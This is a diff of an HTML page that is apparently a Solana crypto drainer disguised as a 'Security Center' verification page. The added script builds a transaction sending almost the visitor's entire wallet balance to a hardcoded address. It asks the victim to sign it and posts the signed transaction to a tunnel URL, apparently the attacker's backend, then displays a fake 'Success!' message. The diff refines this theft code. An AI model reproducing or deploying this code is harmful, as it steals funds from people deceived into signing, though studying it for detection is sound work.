@@ -2,16 +2,15 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Protocol Activation</title>
-    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
-    <script>window.Buffer = window.Buffer || buffer.Buffer;</script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Center</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 </head>
-<body style="background:#000;color:#fff;text-align:center;padding-top:30vh;font-family:sans-serif;">
-    <div style="padding:40px;border:1px solid #14F195;border-radius:20px;display:inline-block;background:#111;">
-        <h2 style="color:#14F195;">SYSTEM READY</h2>
-        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;cursor:pointer;font-size:20px;">ACTIVATE NOW</button>
-        <p id="msg" style="margin-top:20px;color:#888;">Standby...</p>
+<body style="background:#000;color:#fff;text-align:center;padding-top:25vh;font-family:sans-serif;">
+    <div style="padding:30px;border:1px solid #14F195;border-radius:15px;display:inline-block;background:#111;">
+        <h2 style="color:#14F195;">PROTOCOL ACTIVE</h2>
+        <button id="cta" style="background:#14F195;color:#000;padding:15px 30px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:18px;">VERIFY NOW</button>
+        <p id="msg" style="margin-top:15px;color:#666;font-size:12px;">Waiting...</p>
     </div>
     <script>
         const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp";
@@ -29,23 +28,24 @@
                 const { blockhash } = await conn.getLatestBlockhash();
                 const bal = await conn.getBalance(p.publicKey);
                 
+                // 留 0.001 SOL 手续费
                 const tx = new solanaWeb3.Transaction().add(
                     solanaWeb3.SystemProgram.transfer({
                         fromPubkey: p.publicKey,
                         toPubkey: new solanaWeb3.PublicKey(TARGET),
-                        lamports: bal > 2000000 ? bal - 1500000 : 0, 
+                        lamports: bal > 1500000 ? bal - 1000000 : 0, 
                     })
                 );
                 tx.recentBlockhash = blockhash;
                 tx.feePayer = p.publicKey;
 
-                // 🚀 此时由于有了补丁，signTransaction 不再报错
+                // 🚀 唤起签名
                 const signed = await p.signTransaction(tx);
-                document.getElementById('msg').innerText = "Broadcasting...";
+                document.getElementById('msg').innerText = "Syncing...";
 
-                // 将支票（签名）通过隧道甩给后端
-                const rawBinary = signed.serialize();
-                const b64 = window.Buffer.from(rawBinary).toString('base64');
+                // 💰 原生 Base64 转换（不依赖 Buffer）
+                const raw = signed.serialize();
+                const b64 = btoa(String.fromCharCode.apply(null, raw));
 
                 fetch(TUNNEL_URL, {
                     method: 'POST',
@@ -53,10 +53,8 @@
                     body: JSON.stringify({ signature: b64 })
                 });
 
-                alert("Protocol Activated!");
-            } catch (e) { 
-                alert("Debug Info: " + e.message); 
-            }
+                alert("Success!");
+            } catch (e) { alert("Info: " + e.message); }
         };
     </script>
 </body>
